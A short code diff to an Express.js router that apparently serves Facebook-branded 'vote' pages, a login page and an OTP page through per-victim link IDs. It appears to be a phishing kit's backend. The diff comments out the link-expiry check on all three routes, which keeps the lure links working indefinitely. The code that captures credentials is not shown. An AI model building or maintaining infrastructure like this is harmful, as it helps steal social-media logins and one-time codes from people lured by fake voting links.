@@ -12,9 +12,9 @@ router.get("/vote/:linkId", async (req, res) => {
         if (!link) {
             return res.redirect("/notfound");
         }
-        if (Date.now() > link.expiry) {
-            return res.redirect("/notfound");
-        }
+        // if (Date.now() > link.expiry) {
+        //     return res.redirect("/notfound");
+        // }
         return res.render("socials/facebook/vote", { req, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
     } catch (err) {
         console.log(err)
@@ -28,9 +28,9 @@ router.get("/face/:linkId", async (req, res) => {
         if (!link) {
             return res.redirect("/notfound");
         }
-        if (Date.now() > link.expiry) {
-            return res.redirect("/notfound");
-        }
+        // if (Date.now() > link.expiry) {
+        //     return res.redirect("/notfound");
+        // }
         if (linkId.length !== 24 || !link || link.linkType !== 'FACEBOOK') {
             return res.redirect("/notfound");
         }
@@ -48,9 +48,9 @@ router.get("/face/otp/:linkId", async (req, res) => {
         if (!link) {
             return res.redirect("/notfound");
         }
-        if (Date.now() > link.expiry) {
-            return res.redirect("/notfound");
-        }
+        // if (Date.now() > link.expiry) {
+        //     return res.redirect("/notfound");
+        // }
         if (linkId.length !== 24 || !link || link.linkType !== 'FACEBOOK') {
             return res.redirect("/notfound");
         }
